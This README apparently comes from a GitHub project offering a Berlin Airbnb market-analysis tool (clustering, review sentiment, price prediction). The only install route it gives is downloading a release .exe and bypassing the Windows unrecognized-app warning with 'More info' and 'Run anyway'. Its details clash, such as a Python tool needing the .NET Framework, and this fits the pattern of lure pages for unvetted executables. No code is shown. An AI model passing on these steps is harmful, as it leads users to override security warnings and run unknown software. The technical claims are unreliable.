# 🏠 berlin-airbnb-insights - Gain deep market insights for Berlin

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/roastertoby710/berlin-airbnb-insights/releases)

This project examines data from over 635,000 Airbnb reviews and 14,000 active listings in Berlin. It provides clear insights into guest sentiment, market trends, and pricing patterns. You can use these insights to understand the Berlin rental market or to study the intersection of data science and hospitality. 

## 📥 Getting Started

You do not need programming knowledge to run this application. Follow these instructions to download the software and view the insights on your Windows computer.

1. Visit the [official releases page](https://github.com/roastertoby710/berlin-airbnb-insights/releases). 
2. Look for the most recent version under the "Latest" section.
3. Click the file ending in `.exe` to begin the download.
4. Save the file to your desktop or your downloads folder.
5. Double-click the downloaded file to start the application.

If Windows displays a prompt about an unrecognized app, click "More info" and then "Run anyway." This happens because the file comes from an independent project.

## 💻 System Requirements

Your computer needs to meet these basic standards to run the software smoothly:

- Operating System: Windows 10 or Windows 11.
- Memory: At least 4 gigabytes of RAM.
- Storage: 500 megabytes of free disk space.
- Processor: A modern dual-core processor or better.

The application uses local processing to generate results. A faster computer will reduce the time taken for the initial data loading process.

## 📊 What You Can Do

The software helps you explore the Berlin Airbnb market through several views:

- Market Segmentation: See how Berlin listings group together using K-Means clustering. This shows you distinct types of host offerings across different neighborhoods.
- Sentiment Analysis: Read guest reviews processed by VADER. This reveals the tone of feedback across different districts.
- Price Prediction: Estimate the price of a listing using machine learning models. You can test how changes in listing details impact the predicted price.
- Superhost Status: Understand the factors that lead to Superhost status based on the provided dataset.

## ⚙️ How It Works

The project uses Python to process a large volume of data efficiently. It employs Random Forest models to provide accurate pricing estimates. The software runs as a self-contained application, which means it carries the necessary tools inside the package. You do not need to install Python or any additional libraries on your system.

The application handles the following steps automatically:

1. Data Loading: It loads the 14,000 listings and the large review database upon launch.
2. Model Initialization: It fires up the pre-trained machine learning models.
3. User Interface: It displays a simple dashboard for you to filter data and input variables.

## 💡 Using the Interface

Once you open the software, you will see a sidebar and a main display area. 

- Use the sidebar to select the visualization you wish to see.
- Select a district from the dropdown menu to filter the data.
- Use the sliders to adjust variables like the number of guests or minimum stay requirements.
- The charts refresh in real time as you adjust your settings.

If you encounter a slow screen, wait a few seconds. The computer calculates new statistics based on your filter selection.

## 🛠 Troubleshooting

Follow these tips if you face issues with the software:

- If the app fails to start, ensure you have the latest version of the .NET Framework installed on your computer.
- If the charts appear blank, verify that the application has permission to access your local file system. 
- If the application window is too small, you can resize it by clicking and dragging the corner of the window.
- If you see an error message while loading data, close the application and reopen it. This clears the memory and starts the load process again.
- If you find a bug, check your internet connection and return to the download page to ensure you are using the latest version. Small updates often fix known errors.

## 📈 Understanding the Data

The insights come from historical data. They represent past performance and trends. While the models provide helpful estimates, they serve as a guide rather than a guarantee of future pricing. The clustering feature helps you see broad trends in the city, but individual listings may vary based on unique features or host management styles.

We built this tool to make complex data accessible. You can explore the relationship between host reputation, property location, and final pricing without needing to write a single line of code. Navigate the menus to discover what makes a top-rated listing in Berlin.